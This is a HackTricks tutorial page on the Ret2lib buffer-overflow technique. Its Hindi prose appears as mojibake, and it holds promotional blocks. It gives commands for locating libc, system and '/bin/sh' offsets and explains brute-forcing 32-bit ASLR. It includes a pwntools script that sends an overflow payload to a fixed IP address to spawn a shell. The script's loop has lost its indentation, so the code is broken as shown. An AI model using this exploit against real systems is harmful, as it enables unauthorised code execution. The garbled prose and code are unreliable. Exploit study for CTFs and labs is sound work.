# Ret2lib

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## **рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА**

**Ret2Libc** рдХрд╛ рд╕рд╛рд░ рд╣реИ рдХрд┐рд╕реА рд╡рдВрд▓рд░рдмрд▓ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдлреНрд▓реЛ рдХреЛ рдПрдХ рд╕рд╛рдЭрд╛ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рдлрд╝рдВрдХреНрд╢рди (рдЬреИрд╕реЗ, **system**, **execve**, **strcpy**) рдореЗрдВ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛ рд╣реИ рдмрдЬрд╛рдп рдЯреИрдХрд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╢реЗрд▓рдХреЛрдб рдХреЛ рд╕реНрдЯреИрдХ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рд╣рдорд▓рд╛рд╡рд╛рд░ рдПрдХ рдкреЗрд▓реЛрдб рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рд╕реНрдЯреИрдХ рдкрд░ рд╡рд╛рдкрд╕реА рдкрддрд╛ рд╕рдВрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╡рд╛рдВрдЯреЗрдб рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдлрд╝рдВрдХреНрд╢рди рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИ, рд╕рд╛рде рд╣реА рдХреЙрд▓рд┐рдВрдЧ рдХрдиреНрд╡реЗрдВрд╢рди рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЖрд╡рд╢реНрдпрдХ рддрд░реАрдХреЗ рд╕реЗ рдХрд┐рд╕реА рднреА рдЖрд╡рд╢реНрдпрдХ рддрд░реНрдХреЛрдВ рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рд╡реНрдпрд╡рд╕реНрдерд┐рдд рдХрд░рддрд╛ рд╣реИред

### **рдЙрджрд╛рд╣рд░рдг рдХрджрдо (рд╕рд░рд▓рд┐рдд)**

* рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рдВрдХреНрд╢рди (рдЬреИрд╕реЗ, рд╕рд┐рд╕реНрдЯрдо) рдФрд░ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб (рдЬреИрд╕реЗ, /bin/sh) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ
* рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреЛ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ рдЬреЛ рдХрдорд╛рдВрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреЛ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдкрд░ рдирд┐рд╖реНрдкрд╛рджрди рдлреНрд▓реЛ рдХреЛ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред

## рдкрддреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

* рдорд╛рди рд▓реЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ `libc` рд╡рд╣реА рд╣реИ рдЬреЛ рд╡рд░реНрддрдорд╛рди рдорд╢реАрди рд╕реЗ рд╣реЛрдЧрд╛, рддреЛ рдЖрдк рдпрд╣рд╛рдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдореЗрдореЛрд░реА рдореЗрдВ рдХрд╣рд╛рдВ рд▓реЛрдб рд╣реЛрдЧрд╛:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

рдпрджрд┐ рдЖрдк рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ ASLR libc рдХреЗ рдкрддреЗ рдХреЛ рдмрджрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* рдЬрд╛рдирддреЗ рд╣реБрдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП libc рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ, `system` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдСрдлрд╝рд╕реЗрдЯ рдвреВрдВрдврдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* рдЬрд╛рдирддреЗ рд╣реБрдП рдЬрд┐рд╕ libc рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЙрд╕рд╕реЗ `/bin/sh` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдСрдлрд╕реЗрдЯ рдвреВрдВрдврдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### рдЬреАрдбреАрдмреА-рдкреАрдбрд╛ / рдЬреАрдИрдПрдл рдХрд╛ рдЙрдкрдпреЛрдЧ

рд▓рд┐рдмрд╕реА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рдмрд╛рдж, **system** рдлрд╝рдВрдХреНрд╢рди, **exit** рдлрд╝рдВрдХреНрд╢рди рдФрд░ рд╕реНрдЯреНрд░рд┐рдВрдЧ **`/bin/sh`** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП Peda рдпрд╛ GEF рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рд╕рдВрднрд╡ рд╣реИ:
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps рдХрд╛ рдЙрдкрдпреЛрдЧ

рдпрджрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдмрд╛рдд рдХрд░рддреЗ рд╣реИрдВ **рдмрдЪреНрдЪреЗ** рдмрдирд╛ рд░рд╣реА рд╣реИ (рдиреЗрдЯрд╡рд░реНрдХ рд╕рд░реНрд╡рд░), рддреЛ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдкрдврд╝рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЖрдкрдХреЛ рд░реВрдЯ рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред

рдпрд╣рд╛рдБ рдЖрдкрдХреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ **рд╕рдЯреАрдХ рд░реВрдк рд╕реЗ рдХрд╣рд╛рдБ рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рд╣реИ libc** рдФрд░ **рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдмрдЪреНрдЪреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛рдБ рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ** рдпрд╣ рдкрддрд╛ рдЪрд▓ рд╕рдХрддрд╛ рд╣реИред

![](<../../../.gitbook/assets/image (850).png>)

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ **0xb75dc000** рдореЗрдВ рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рд╣реИ (рдпрд╣ libc рдХрд╛ рдЖрдзрд╛рд░ рдкрддрд╛ рд╣реЛрдЧрд╛)

## рдЕрдЬреНрдЮрд╛рдд libc

рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдирд╣реАрдВ рд╣реЛ рдХрд┐ **рдмрд╛рдЗрдирд░реА рдХрд┐рд╕ libc рдХреЛ рд▓реЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИ** (рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рд╕рд░реНрд╡рд░ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХрд╛ рдХреЛрдИ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реИ)ред рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рд╡рд┐рдХрд▓реНрдк рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдХреБрдЫ рдкрддреЗ рдЪреЛрд░реА рдХрд░рдиреЗ рдФрд░ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреМрди рд╕рд╛ libc** рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

рдФрд░ рдЖрдк рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ pwntools рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2 рдСрдлрд╕реЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде libc рдХреЛ рдЬрд╛рдиреЗрдВ

рдкреГрд╖реНрда [https://libc.blukat.me/](https://libc.blukat.me/) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдФрд░ libc рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрд╕реНрдХрд░рдг** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдПред

## 32 рдмрд┐рдЯ рдореЗрдВ ASLR рдХреЛ рдЙрдордХрд╛рд░рдирд╛

рдпреЗ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕рд┐рдВрдЧ рд╣рдорд▓реЗ **рдХреЗрд╡рд▓ 32 рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рд▓рд┐рдП** рдЙрдкрдпреЛрдЧреА рд╣реИрдВред

* рдпрджрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╕реНрдерд╛рдиреАрдп рд╣реИ, рддреЛ рдЖрдк libc рдХрд╛ рдЖрдзрд╛рд░ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (32 рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* рдЕрдЧрд░ рдЖрдк рдПрдХ рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд░ рдкрд░ рд╣рдорд▓рд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк `libc` рдлрд╝рдВрдХреНрд╢рди `usleep` рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рдЖрдк 10 рдХреЛ рдПрд░реНрдЧреНрдпреВрдореЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдХрд┐рд╕реА рд╕рдордп рд╕рд░реНрд╡рд░ **10 рд╕реЗрдХрдВрдб рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдордп** рд▓реЗрддрд╛ рд╣реИ рддреЛ рдЖрдкрдиреЗ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд▓рд┐рдпрд╛ рд╣реИред

## рдПрдХ рдЧреИрдЬреЗрдЯ

`libc` рдореЗрдВ **рдПрдХ** рд╡рд┐рд╢рд┐рд╖реНрдЯ **рдкрддреЗ** рдкрд░ рдЬрд╛рдХрд░ рд╢реИрд▓реА рдЪрд▓рд╛рдПрдВ:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ ASLR рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХреЛрдб рдореЗрдВ рдПрдХреАрдХреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рд╡рдВрд╢рд╛рд╡рд▓реА рдмрд╛рдЗрдирд░реА рдПрдХ рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд░ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib рдЙрджрд╛рд╣рд░рдг

ARM64 рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, ret рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди x30 рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЗ рджрд┐рдЦрд╛рдиреЗ рдХреА рдУрд░ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рди рдХрд┐ рд╕реНрдЯреИрдХ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЗ рджрд┐рдЦрд╛рдиреЗ рдХреА рдУрд░ред рдЗрд╕рд▓рд┐рдП рдпрд╣ рдереЛрдбрд╝рд╛ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, ARM64 рдореЗрдВ рдПрдХ рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди рд╡рд╣реА рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди рдХрд░рддрд╛ рд╣реИ (рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди рдХреЗ рдмреАрдЪ рдореЗрдВ рдЬрд╛рдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдирдП рдмрдирд╛рдиреЗ рдХрд╛ рд╕рдВрднрд╛рд╡рдирд╛ рдирд╣реАрдВ рд╣реИ)ред

рдЙрджрд╛рд╣рд░рдг рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (рдпрд╛ puts)

рдЗрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреБрдЫ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рддрд░рд╣ рдХреЗ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд░рдЦрдХрд░ `printf`/`puts` рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `puts` рдХреЗ рдкрддреЗ рдХреЛ GOT рдореЗрдВ рдбрд╛рд▓рдХрд░ `puts` рдХреЗ рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рд╕реЗ рдореЗрдореЛрд░реА рдореЗрдВ `puts` рдХрд╛ рдкрддрд╛ **рд▓реАрдХ** рдХрд░реЗрдЧрд╛ред

## Ret2printf

рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдПрдХ **Ret2lib рдХреЛ `printf` рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╡реНрдпрдХреНрддрд┐рдЧрддрд╛ рдореЗрдВ рдмрджрд▓рдиреЗ** рдХрд╛ рдЕрднрджреНрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ, `ret2lib` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `printf` рдХреЛ рдмреБрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдиреЛрдВ рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдпрд╣ рдмреЗрдХрд╛рд░ рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╕рдВрднрд╡ рд╣реИ):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрддреЗ рдореЗрдВ рд▓реАрдХ рджреЗрдиреЗ рдХреЗ рдмрд╛рдж, рдПрдХ рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо рд╣реИ рд▓реЗрдХрд┐рди PIE рдирд╣реАрдВ, рдкрд╣рд▓рд╛ рдХрджрдо рдПрдХ рдХреИрдирд╛рд░реА рдХреЗ 0x00 рдмрд╛рдЗрдЯ рддрдХ рдУрд╡рд░рдлреНрд▓реЛ рднрд░рдирд╛ рд╣реИ рдФрд░ рдлрд┐рд░ puts рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рд▓реАрдХ рдХрд░рдирд╛ рд╣реИред рдХреИрдирд╛рд░реА рдХреЗ рд╕рд╛рде рдПрдХ ROP рдЧреИрдЬреЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ puts рдХреЛ рдмреБрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП GOT рд╕реЗ puts рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдПрдХ ROP рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо рд╣реИ, рдХреЛрдИ рдХреИрдирд╛рд░реА рдирд╣реАрдВ, рдореБрдЦреНрдп рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ рдореЗрдВ рдПрдХ рдмрдЪреНрдЪреЗ рдлрд╝рдВрдХреНрд╢рди рд╕реЗред puts рдХреЛ рдмреБрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП puts рдХреЗ рдкрддреЗ рдХреЛ GOT рд╕реЗ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдлрд┐рд░ рдПрдХ рд╡рди рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 рдмрд┐рдЯ, рдХреЛрдИ PIE рдирд╣реАрдВ, рдХреЛрдИ рдХреИрдирд╛рд░реА рдирд╣реАрдВ, рдХреЛрдИ relro рдирд╣реАрдВ, nxред write рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ write (libc) рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдПрдХ рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* рд╕реНрдЯреИрдХ рд╕реЗ рдХреИрдирд╛рд░реА рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░рдирд╛ (рдпрд╣ GOT рдореЗрдВ рд╣реИ) `/bin/sh` рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рдеред
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 рдмрд┐рдЯ, рдХреЛрдИ relro рдирд╣реАрдВ, рдХреЛрдИ рдХреИрдирд╛рд░реА рдирд╣реАрдВ, nx, pieред рд╕реНрдЯреИрдХ рд╕реЗ libc рдФрд░ рд╣реАрдк рдХреЗ рдкрддреЛрдВ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмреБрд░рд╛ рдЗрдВрдбреЗрдХреНрд╕рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ред `system('/bin/sh')` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ret2lib рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ (рд╣реАрдк рдкрддрд╛ рдПрдХ рдЬрд╛рдВрдЪ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ)ред

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

